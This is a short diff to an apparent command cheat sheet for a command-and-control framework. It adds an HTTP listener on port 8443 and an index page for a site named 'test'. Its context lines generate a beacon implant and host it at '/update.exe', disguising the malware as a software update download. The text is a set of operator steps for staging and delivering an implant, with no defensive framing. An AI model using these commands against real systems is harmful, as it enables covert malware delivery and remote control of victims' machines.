@@ -22,6 +22,8 @@ use ID
 
 ```
 http --lhost 0.0.0.0 --lport 8888
+
+http --website test --lhost 0.0.0.0 --lport 8443
 ```
 
 ## PROFILES
@@ -36,5 +38,6 @@ profiles generate monbeaconprofil --save /tmp/beacon.exe
 
 websites add-content --website distrib --web-path /update.exe --content /tmp/beacon.exe
 
-beacons interact ID
+websites add-content --content /tmp/index.html --web-path / --website test
+
 ```
